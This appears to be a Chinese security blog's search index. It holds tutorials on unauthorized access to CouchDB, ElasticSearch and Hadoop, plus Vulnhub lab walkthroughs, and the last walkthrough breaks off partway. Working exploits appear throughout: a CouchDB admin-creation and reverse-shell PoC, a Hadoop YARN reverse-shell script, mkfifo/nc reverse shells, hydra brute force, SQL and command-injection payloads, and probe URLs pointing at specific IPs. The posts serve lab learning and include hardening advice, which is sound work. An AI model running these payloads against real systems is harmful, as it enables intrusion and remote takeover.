<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Couchdb 未授权访问</title>
    <url>/2023/05/17/Couchdb/</url>
    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p>
</div>

<div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
</div>

<div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p>
</div>

<div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
</div>

<div class="timeline purple"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-17</p>
</div></div><div class='timeline-item-content'><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p>
<p>CouchDB 默认在 5984 端口开放 Restful 的 API 接口，用于数据库的管理功能。其 HTTP Server 默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过 API 访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关 API 对服务器上的数据进行任意的增删改查，其中通过 API 修改 local.ini 配置文件，可进一步导致执行任意系统命令，获取服务器权限！</p>
<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>使用 vulhub 搭建</p>
<p>启动完成后，访问<code>http://your-ip:5984/</code>即可看到Couchdb的欢迎页面。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h3 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a><strong>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</strong></h3><p>任意用户创建</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">数据包中发送两个 roles 数据包，可绕过限制，建立用户</span><br><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;vulhub&quot;</span>,</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [<span class="string">&quot;_admin&quot;</span>],</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;vulhub&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a><strong>Couchdb 任意命令执行漏洞（CVE-2017-12636）</strong></h3><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。</p>
<p><strong>利用条件</strong></p>
<p>影响版本：小于 1.7.0 以及 小于 2.1.1</p>
<p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>先增加一个管理员用户。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">利用方式</span><br><span class="line">使用msf模块：linux/http/apache_couchdb_cmd_exec</span><br><span class="line"></span><br><span class="line">poc 代码</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://your-ip/:5984&#x27;</span></span><br><span class="line"><span class="built_in">command</span> = rb<span class="string">&quot;&quot;</span><span class="string">&quot;sh -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">version = 1</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># session.proxies = &#123;</span></span><br><span class="line"><span class="comment">#     &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">session.put(target + <span class="string">&#x27;/_users/org.couchdb.user:wooyun&#x27;</span>, data=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;wooyun&quot;,</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="string">  &quot;password&quot;: &quot;wooyun&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(<span class="string">&#x27;wooyun&#x27;</span>, <span class="string">&#x27;wooyun&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> = <span class="string">&quot;bash -c &#x27;&#123;echo,%s&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span> % base64.b64encode(<span class="built_in">command</span>).decode()</span><br><span class="line"><span class="keyword">if</span> version == 1:</span><br><span class="line">    session.put(target + (<span class="string">&#x27;/_config/query_servers/cmd&#x27;</span>), data=json.dumps(<span class="built_in">command</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = session.get(target + <span class="string">&#x27;/_membership&#x27;</span>).json()[<span class="string">&#x27;all_nodes&#x27;</span>][0]</span><br><span class="line">    session.put(target + <span class="string">&#x27;/_node/&#123;&#125;/_config/query_servers/cmd&#x27;</span>.format(host), data=json.dumps(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun&#x27;</span>)</span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == 1:</span><br><span class="line">    session.post(target + <span class="string">&#x27;/wooyun/_temp_view?limit=10&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    session.put(target + <span class="string">&#x27;/wooyun/_design/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h1><ul>
<li>指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 文件中找到 “bind_address &#x3D; 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</li>
<li>设置访问密码 （需要重启CouchDB才能生效） 在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 中找到“[admins]”字段配置密码</li>
</ul>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
<li><a href="https://paper.seebug.org/409/#0x09-couchdb">https://paper.seebug.org/409/#0x09-couchdb</a></li>
<li><a href="https://vulhub.org/#/environments/couchdb/CVE-2017-12636/">https://vulhub.org/#/environments/couchdb/CVE-2017-12636/</a></li>
</ul>
</div></div></div>

<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
</div>

]]></content>
      <categories>
        <category>未授权访问</category>
        <category>Couchdb</category>
      </categories>
      <tags>
        <tag>Couchdb</tag>
      </tags>
  </entry>
  <entry>
    <title>ElasticSearch 未授权访问</title>
    <url>/2023/05/16/ElasticSearch/</url>
    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p>
</div>

<div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
</div>

<div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p>
</div>

<div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
</div>

<div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-16</p>
</div></div><div class='timeline-item-content'><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Elasticsearch 是一款 java 编写的企业级搜索服务。越来越多的公司使用 ELK 作为日志分析，启动此服务默认会开放9200端口，可被非法操作数据。</p>
<p>漏洞检测：默认端口9200</p>
<p>相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作。</p>
<p>返回内容中包含”You Know, for Search”</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">利用接口</span><br><span class="line">http://x.x.x.x:9200/_nodes</span><br><span class="line">http://x.x.x.x:9200/_river</span><br><span class="line">http://101.198.161.130:9200/_cat/indices/</span><br><span class="line">http://101.198.161.130:9200/_plugin/head/</span><br><span class="line">http://101.198.161.130:9200/_nodes?prettify</span><br><span class="line">http://101.198.161.130:9200/_status</span><br><span class="line">http://101.198.161.130:9200/_search?pretty</span><br><span class="line">http://10.203.9.131:9200/zjftu/</span><br><span class="line">http://10.203.9.131:9200/zjftu/_search?pretty</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><ul>
<li>关闭9200端口</li>
<li>防火墙规则限制禁止外网访问端口</li>
<li>设置端口账号认证</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://blkstone.github.io/2017/09/27/elasticsearch-unauthorized-access/">http://blkstone.github.io/2017/09/27/elasticsearch-unauthorized-access/</a></p>
<p><a href="http://blkstone.github.io/2017/09/27/elasticsearch-unauthorized-access/">http://blkstone.github.io/2017/09/27/elasticsearch-unauthorized-access/</a></p>
</div></div></div>

<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
</div>

]]></content>
      <categories>
        <category>未授权访问</category>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop 未授权访问</title>
    <url>/2023/05/17/Hadoop/</url>
    <content><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>学习记录</p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
</div>

<div class="timeline orange"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-17</p>
</div></div><div class='timeline-item-content'><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>由于服务器直接在开放了 Hadoop 机器 的多个 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p>
<p>ResourceManager 默认端口8088   </p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用 vulhub 搭建靶场环境</p>
<p>地址：<a href="https://vulhub.org/#/environments/hadoop/unauthorized-yarn/">https://vulhub.org/#/environments/hadoop/unauthorized-yarn/</a></p>
<p>下载环境，进入漏洞环境目录执行：<code>docker-compose up -d</code> 启动安装启动环境</p>
<p>环境启动后，访问<code>http://your-ip:8088</code>即可看到Hadoop YARN ResourceManager WebUI页面。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>调用 New Application API 创建 Application 进行代码注入，反弹shell。</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><ul>
<li>启动 msfconsole</li>
<li>search hadoop</li>
<li>use linux&#x2F;http&#x2F;hadoop_unauth_exec</li>
<li>设置目标ip，本地监听ip</li>
<li>exploit</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">py poc 代码</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.0.1&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>

<h1 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h1><ul>
<li>关闭hadoop web 管理页面</li>
<li>开启身份验证，防止未授权用户访问</li>
<li>设置防火墙安全组策略，禁止端口公网访问，限制可信ip</li>
</ul>
<h1 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h1><p><a href="https://vulhub.org/#/environments/hadoop/unauthorized-yarn/">https://vulhub.org/#/environments/hadoop/unauthorized-yarn/</a></p>
<p><a href="https://paper.seebug.org/409/#0x08-hadoop">https://paper.seebug.org/409/#0x08-hadoop</a></p>
</div></div></div>

<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
</div>

]]></content>
      <categories>
        <category>未授权访问</category>
        <category>Hadoop</category>
      </categories>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub靶场BoredHackerBlog</title>
    <url>/2022/11/12/bac5/</url>
    <content><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>吃了么,睡了么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>有拥抱么，有晚安么</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
</div>

<h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p>
</div></div><div class='timeline-item-content'><h6 id="Vulnhub"><a href="#Vulnhub" class="headerlink" title="Vulnhub"></a>Vulnhub</h6><p>地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</a></p>
<p>描述:<br>这是一个云端反病毒扫描程序！是一种基于云的防病毒扫描服务。<br>目前，它处于测试模式。系统要求您测试设置并查找漏洞并升级隐私。</p>
<p>难度：简单<br>目标：获得root权限</p>
<p>涉及的任务：<br>端口扫描<br>网页应用攻击<br>SQL注入<br>命令注入<br>暴力破解<br>代码分析</p>
</div></div></div>


<h1 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h1><div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p>
</div></div><div class='timeline-item-content'><h6 id="操作系统："><a href="#操作系统：" class="headerlink" title="操作系统："></a>操作系统：</h6><p>物理机：Arch linux<br>虚拟机：kali linux<br>虚拟机程序：Virtualbox</p>
<h6 id="使用程序："><a href="#使用程序：" class="headerlink" title="使用程序："></a>使用程序：</h6><p>arp-scan  用于目标发现<br>ping      用于目标发现<br>arping    用于目标发现<br>nmap      用于服务识别<br>nc        用于shell反弹<br>hydra     用于密码破解<br>burpsuite 用于web测试</p>
</div></div></div>


<h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -I eth0 -l                                                               <span class="comment">#arp发现，确定目标ip地址</span></span><br><span class="line">nmap -sn 192.168.56.1/24                                                          <span class="comment">#ping扫描，禁用端口扫描</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 10); <span class="keyword">do</span> ping -c 1 192.168.56.<span class="variable">$i</span>; <span class="keyword">done</span>                 <span class="comment">#shell 批量ping扫描 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 10); <span class="keyword">do</span> sudo arping -c 1 192.168.56.<span class="variable">$i</span>; <span class="keyword">done</span>     <span class="comment">#shell 批量arping扫描</span></span><br><span class="line"></span><br><span class="line">部分列举，方式很多，根据实际场景进行选择测试</span><br></pre></td></tr></table></figure>


<h2 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.56.108    <span class="comment">#进行全端口扫描</span></span><br><span class="line">nmap -p22,8080 192.168.56.108    <span class="comment">#进行端口服务识别</span></span><br><span class="line"></span><br><span class="line">根据发现的主机目标进行全端口扫描，随后进行端口服务发现</span><br></pre></td></tr></table></figure>


<h2 id="服务入侵"><a href="#服务入侵" class="headerlink" title="服务入侵"></a>服务入侵</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l root -P rockyou.txt -t 32 -vV  192.168.56.108 ssh -f     <span class="comment">#指定账户，密码字典，对目标进行ssh暴力破解 </span></span><br><span class="line"></span><br><span class="line">对发现的服务进行入侵，ssh尝试未果</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh暴力破解长时间未成功，随后web访问8080端口，出现输入框，需要密码，简单测试后发现sql注入漏洞</span><br><span class="line">注入代码：<span class="string">&quot; or 1=1 --  后面有一个空格</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">随后进入一个新的页面，简单测试后发现存在命令行注入漏洞</span><br><span class="line">命令行注入代码： | <span class="built_in">command</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">通过命令行注入，执行nc,反弹shell</span><br><span class="line"><span class="built_in">rm</span> /tmp/m;<span class="built_in">mkfifo</span> /tmp/m;<span class="built_in">cat</span> /tmp/m|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.107 4444 &gt;/tmp/m</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">随后在用户主目录发现拥有suid,root权限的可执行程序，通过此程序调用nc反弹shell,获得root权限</span><br><span class="line">./upload_cloudav <span class="string">&quot;rm /tmp/m;mkfifo /tmp/m;cat /tmp/m|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.107 5555 &gt;/tmp/m&quot;</span></span><br></pre></td></tr></table></figure>



<h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><h2 id="积极向上"><a href="#积极向上" class="headerlink" title="积极向上"></a>积极向上</h2><h2 id="热爱生活"><a href="#热爱生活" class="headerlink" title="热爱生活"></a>热爱生活</h2><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈 </p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
</div>


]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
        <tag>web</tag>
        <tag>all</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub靶场CHRONOS-1</title>
    <url>/2022/11/17/bc6/</url>
    <content><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>吃了么,睡了么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>有拥抱么，有晚安么</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
</div>

<h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p>
</div></div><div class='timeline-item-content'><h6 id="Vulnhub"><a href="#Vulnhub" class="headerlink" title="Vulnhub"></a>Vulnhub</h6><p>地址：<a href="https://www.vulnhub.com/entry/chronos-1,735/">https://www.vulnhub.com/entry/chronos-1,735/</a></p>
<p>描述:</p>
<p>难度：中等<br>目标：获得root权限,flag*2</p>
<p>涉及的任务：<br>端口扫描<br>WEB侦查<br>命令注入<br>数据编解码<br>搜索引擎<br>框架漏洞利用<br>代码审计<br>NC反弹shell<br>本地提权</p>
</div></div></div>


<h1 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h1><div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p>
</div></div><div class='timeline-item-content'><h6 id="操作系统："><a href="#操作系统：" class="headerlink" title="操作系统："></a>操作系统：</h6><p>物理机：Arch linux<br>虚拟机：kali linux<br>虚拟机程序：Virtualbox</p>
<h6 id="使用程序："><a href="#使用程序：" class="headerlink" title="使用程序："></a>使用程序：</h6><p>sudo netdiscover -i eth1  用于目标发现<br>arp-scan  用于目标发现<br>nmap      用于服务识别<br>nc        用于shell反弹<br>hydra     用于密码破解<br>burpsuite 用于web测试</p>
</div></div></div>


<h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -i eth1  指定网卡，对目标网段进行arp主机发现</span><br><span class="line"></span><br><span class="line">确定目标 192.168.56.109  为测试靶机目标</span><br></pre></td></tr></table></figure>


<h2 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.56.109 对发现目标进行全端口扫描</span><br><span class="line">nmap -p22,80,8000 -sV 192.168.56.109  对目标开放端口进行服务识别</span><br><span class="line"></span><br><span class="line">通过扫描发现目标开启22,80,8000端口，一个ssh,两个web服务，</span><br><span class="line">80使用apache实现，8000使用nodejs,并且获得了对应版本信息，操作系统版本信息为ubuntu</span><br></pre></td></tr></table></figure>
<h2 id="服务进攻"><a href="#服务进攻" class="headerlink" title="服务进攻"></a>服务进攻</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l root -P rockyou.txt -t 32 -vV 192.168.56.109  ssh -f   首先对发现的第一个点进行攻击,使用hydra 进行ssh暴力破解</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>随后对下一个发现点进行测试，浏览器访问80,8000端口发现源代码里面存在一段相同jscript代码</p>
<p>通过cyberchef进行js代码美化，使代码便于分析，发现里面存在一个域名，但是并没有解析</p>
<p>通过本地hosts文件进行解析，使这段js代码能够正常访问这个域名</p>
<p>随后重新访问80,或者8000网站，js脚本正常加载，域名能够正常访问，发现多出了一个时间显示</p>
<p>随后使用burpsuite查看请求，发现一个get “&#x2F;date?format&#x3D;”请求,随后页面返回一个当前时间信息</p>
<p>随后将提交的数据放入cyberchef进行分析，发现编码为base58编码，解密后的信息为linux命令date的参数，猜测为直接调用date 命令返回信息，猜测存在命令注入漏洞</p>
<p>随后进行测试，将 ;ls 通过base58进行加密后提交，页面显示出目录信息，确定存在命令注入漏洞</p>
<p>进行命令测试，查找反弹shell的方式,将;ls &#x2F;bin 编码后提交,获得可执行的命令列表，发现存在nc</p>
<p>尝试利用nc反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -vnlp 1111   本地监听1111端口，等待目标连接</span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 1111 &gt;/tmp/f  通过此命令进行shell 反弹连接</span><br></pre></td></tr></table></figure>

<p>数据提交后页面显示错误信息，但是并没有影响shell的连接</p>
<p>账号为www-data，目录下发现web程序的源代码程序，进行代码分析<br>代码中对提交数据进行了判断，如果提交了whoami,id,nc等数据会反馈错误信息，但是并没有进行拦截，所以并不影响nc执行</p>
<p>随后在上一级目录中发现了另外一个目录<br>在其中一个文件中发现了使用的框架：express，express-fileupload<br>并且本地开启了8080,监听在127.0.0.1 只能当前主机本地访问，所以扫描无法发现</p>
<p>通过搜索引擎进行查找发现存在漏洞，随后在：<a href="https://blog.p6.is/Real-World-JS-1/">https://blog.p6.is/Real-World-JS-1/</a>  找到漏洞利用代码,修改目标端口，ip信息后执行</p>
